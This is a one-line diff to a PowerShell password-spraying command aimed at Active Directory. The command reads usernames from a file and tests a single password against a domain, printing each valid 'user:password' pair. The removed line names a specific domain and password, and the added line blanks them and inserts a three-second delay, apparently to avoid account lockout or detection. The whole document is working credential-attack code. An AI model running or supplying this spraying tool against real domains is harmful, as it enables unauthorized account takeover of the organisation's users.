@@ -1,1 +1,1 @@
-powershell -c "$d='TELECORE.AD';$p='Welcome2024!';gc users.txt|%{$c=New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain',$d);if($c.ValidateCredentials($_,$p)){'[+] '+$_+':'+$p}else{'[-] '+$_}}"
+powershell -c "$d='';$p='';gc users.txt|%{$c=New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain',$d);if($c.ValidateCredentials($_,$p)){'[+] '+$_+':'+$p}else{'[-] '+$_};sleep 3}"
